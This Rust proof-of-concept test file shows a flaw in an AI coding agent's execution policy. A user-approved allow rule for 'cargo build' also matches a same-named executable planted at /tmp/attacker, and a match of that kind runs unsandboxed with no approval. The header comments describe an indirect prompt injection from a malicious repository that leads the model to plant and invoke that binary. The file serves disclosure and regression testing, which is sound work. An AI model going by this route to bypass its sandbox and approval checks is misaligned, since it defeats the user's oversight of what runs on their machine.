//! PoC: execpolicy Allow rules created by the user-approval amendment path are
//! inherited by any same-basename executable at any absolute path.
//!
//! The user-approval flow persists `prefix_rule(pattern=[...], decision="allow")`
//! via `blocking_append_allow_prefix_rule` (execpolicy/src/amend.rs) — WITHOUT
//! any `host_executable()` registration. `Policy::match_host_executable_rules`
//! (execpolicy/src/policy.rs) validates an absolute-path command against
//! `host_executables_by_name` only when an entry exists for the basename; with
//! no entry the validation is skipped and the bare-name rule matches any path.
//!
//! In core, an Allow decision where every parsed command segment matches an
//! explicit policy rule produces `ExecApprovalRequirement::Skip {
//! bypass_sandbox: true }` (core/src/exec_policy.rs), which
//! `sandbox_override_for_first_attempt` (core/src/tools/sandboxing.rs) turns
//! into `SandboxOverride::BypassSandboxFirstAttempt` — unsandboxed execution
//! with no approval.
//!
//! Related public issue covering only the deny-list side of this seam:
//! https://github.com/openai/codex/issues/37079

#![cfg(unix)]

use anyhow::Result;
use codex_execpolicy::Decision;
use codex_execpolicy::MatchOptions;
use codex_execpolicy::PolicyParser;
use codex_execpolicy::RuleMatch;
use codex_execpolicy::blocking_append_allow_prefix_rule;
use pretty_assertions::assert_eq;
use tempfile::tempdir;

fn tokens(cmd: &[&str]) -> Vec<String> {
    cmd.iter().map(std::string::ToString::to_string).collect()
}

/// Heuristics fallback marking "no rule matched" — in production this routes
/// to the normal sandboxed/approval path rather than a policy-rule Allow.
fn prompt_fallback(_: &[String]) -> Decision {
    Decision::Prompt
}

#[test]
fn approval_amendment_rule_is_inherited_by_same_basename_absolute_path() -> Result<()> {
    // Step 1: persist an approval amendment exactly as production does
    // (core/src/session/mod.rs::persist_execpolicy_amendment ->
    // ExecPolicyManager::append_amendment_and_update ->
    // blocking_append_allow_prefix_rule). Note: no `host_executable()` entry.
    let dir = tempdir()?;
    let policy_path = dir.path().join("default.rules");
    let prefix = tokens(&["cargo", "build"]);
    blocking_append_allow_prefix_rule(&policy_path, &prefix)?;
    let persisted = std::fs::read_to_string(&policy_path)?;
    assert_eq!(
        persisted,
        "prefix_rule(pattern=[\"cargo\", \"build\"], decision=\"allow\")\n"
    );

    // Step 2: load the persisted rule file exactly as `load_exec_policy` does.
    let mut parser = PolicyParser::new();
    parser.parse("user.rules", &persisted)?;
    let policy = parser.build();

    // Step 3: evaluate the attacker scenario. A malicious repository (indirect
    // prompt injection) has the model plant an executable named `cargo` at a
    // sandbox-writable path and invoke it by absolute path; production passes
    // this argv after `parse_shell_lc_plain_commands` segments
    // `bash -lc "/tmp/attacker/cargo build"`.
    let attacker_cmd = vec!["/tmp/attacker/cargo".to_string(), "build".to_string()];
    let evaluation = policy.check_with_options(
        &attacker_cmd,
        &prompt_fallback,
        &MatchOptions {
            resolve_host_executables: true,
        },
    );

    // The vulnerability: the attacker-controlled path at /tmp matches the rule
    // the user approved for the real `cargo`, producing an explicit policy
    // Allow — the exact condition core maps to Skip { bypass_sandbox: true }.
    assert_eq!(evaluation.decision, Decision::Allow);
    assert!(matches!(
        evaluation.matched_rules.as_slice(),
        [RuleMatch::PrefixRuleMatch {
            decision: Decision::Allow,
            ..
        }]
    ));
    Ok(())
}

#[test]
fn registered_host_executable_rejects_unregistered_path() -> Result<()> {
    // Negative control: when the rules file pins `cargo` to its real host
    // location via `host_executable()` (what hand-written or managed rules may
    // do), the unregistered attacker path does NOT match the Allow rule and
    // falls through to the heuristics fallback (Prompt => sandboxed/approval).
    let policy_src = r#"
prefix_rule(pattern = ["cargo", "build"], decision = "allow")
host_executable(name = "cargo", paths = ["/usr/bin/cargo"])
"#;
    let mut parser = PolicyParser::new();
    parser.parse("managed.rules", policy_src)?;
    let policy = parser.build();

    let attacker_cmd = vec!["/tmp/attacker/cargo".to_string(), "build".to_string()];
    let evaluation = policy.check_with_options(
        &attacker_cmd,
        &prompt_fallback,
        &MatchOptions {
            resolve_host_executables: true,
        },
    );
    assert_eq!(evaluation.decision, Decision::Prompt);
    assert!(matches!(
        evaluation.matched_rules.as_slice(),
        [RuleMatch::HeuristicsRuleMatch { .. }]
    ));

    // Intended convenience preserved: the registered real binary invoked by
    // absolute path still matches the rule.
    let real_cmd = vec!["/usr/bin/cargo".to_string(), "build".to_string()];
    let evaluation = policy.check_with_options(
        &real_cmd,
        &prompt_fallback,
        &MatchOptions {
            resolve_host_executables: true,
        },
    );
    assert_eq!(evaluation.decision, Decision::Allow);
    Ok(())
}

#[test]
fn bare_name_invocation_still_matches_amendment_rule() -> Result<()> {
    // Baseline: the normal use of the approval (bare `cargo build`) is
    // unaffected by any fix that only tightens absolute-path matching.
    let dir = tempdir()?;
    let policy_path = dir.path().join("default.rules");
    let prefix = tokens(&["cargo", "build"]);
    blocking_append_allow_prefix_rule(&policy_path, &prefix)?;
    let persisted = std::fs::read_to_string(&policy_path)?;

    let mut parser = PolicyParser::new();
    parser.parse("user.rules", &persisted)?;
    let policy = parser.build();

    let normal_cmd = vec!["cargo".to_string(), "build".to_string()];
    let evaluation = policy.check_with_options(
        &normal_cmd,
        &prompt_fallback,
        &MatchOptions {
            resolve_host_executables: true,
        },
    );
    assert_eq!(evaluation.decision, Decision::Allow);
    Ok(())
}
